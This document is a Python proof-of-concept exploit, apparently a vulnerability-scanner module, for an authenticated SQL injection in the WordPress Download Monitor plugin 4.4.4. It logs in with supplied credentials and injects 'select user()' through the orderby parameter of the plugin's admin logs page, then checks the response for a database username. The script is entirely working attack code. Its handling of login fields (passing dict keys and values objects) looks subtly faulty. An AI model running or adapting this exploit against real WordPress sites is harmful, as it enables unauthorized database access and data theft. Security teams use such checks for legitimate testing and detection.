# coding: utf-8
import requests
import re

#Wordpress Plugin Download Monitor WordPress V 4.4.4 - SQL Injection (Authenticated)
def poc(url,logindict,user_agent,proxy):

    url = url.strip("/")
    # Authentication:
    session = requests.Session()
    auth_url=url+'/wp-login.php'
    redirecto = url + "/wp-admin/"
    username=logindict.keys()
    password=logindict.values()
    header = {'User-Agent': user_agent}
    data = {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': redirecto, 'testcookie': '1'}
    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        auth  = session.post(auth_url, headers=header, data=data, proxies=proxies, timeout=5)
    else:
        auth  = session.post(auth_url, headers=header, data=data, timeout=5)

    sql_injection_code='select+user()'
    # 漏洞位置
    exploit_url = url + '/wp-admin/edit.php?post_type=dlm_download&page=download-monitor-logs&orderby=download_date`' + sql_injection_code + '`user_id'

    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = session.get(exploit_url, headers=header,proxies=proxies)
    else:
        response = session.get(exploit_url, headers=header)


    if response.status_code==200 and re.search('@+',response.text) :
        return 'Wordpress Plugin Download Monitor V 4.4.4 - SQL注入'


def run(url,logindict,user_agent,proxies):
    if logindict:
        result = poc(url,logindict,user_agent,proxies)
        return result


